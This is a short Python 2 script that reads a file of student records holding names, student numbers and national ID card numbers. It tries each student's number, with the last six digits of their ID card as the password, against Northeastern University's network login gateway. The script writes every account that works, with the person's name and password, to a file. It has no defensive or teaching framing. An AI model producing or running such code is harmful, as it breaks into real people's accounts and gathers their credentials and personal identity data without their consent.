# -*- coding: utf-8 -*
import sys,re
reload(sys)
sys.setdefaultencoding( "utf-8" )
import json
filehandler = open('2015.txt','r')
a = filehandler.read()
filehandler.close()
j =json.loads(a.replace('\n', ''))

def Post(urls,data):
    import urllib2
    request = urllib2.Request(urls,data)
    res=urllib2.urlopen(request,timeout=10)
    if res.getcode()!=200:
        return 'There is something Wrong'
    return res.read()
#搜索到2666了
filehandler = open('neuNetPassword2014.txt','a')
# filehandler.write('{"data":[')
for e in j['data']:
    if int(e['id'])>20152009:
        c=Post("http://ipgw.neu.edu.cn:804/srun_portal_pc.php?ac_id=1&","action=login&ac_id=1&user_ip=&nas_ip=&user_mac=&url=&username="+e['id']+"&password="+e['idcard'][12:]+"&save_me=0")
        ran = re.findall('网络已连接',c)
        if ran!=[]:
            print e['name'],e['id'],e['idcard'][12:]
            filehandler.write(e['name']+' '+e['id']+' '+e['idcard'][12:]+'\n')
        elif re.findall('You are already online',c)!=[]:
            print e['name'],e['id'],e['idcard'][12:]
            filehandler.write(e['name']+' '+e['id']+' '+e['idcard'][12:]+'\n')
        elif re.findall('Arrearage users',c)!=[]:
            print e['name'],e['id'],e['idcard'][12:]
            filehandler.write(e['name']+' '+e['id']+' '+e['idcard'][12:]+'\n')
        else:
            print e['name'],e['id']
filehandler.close()
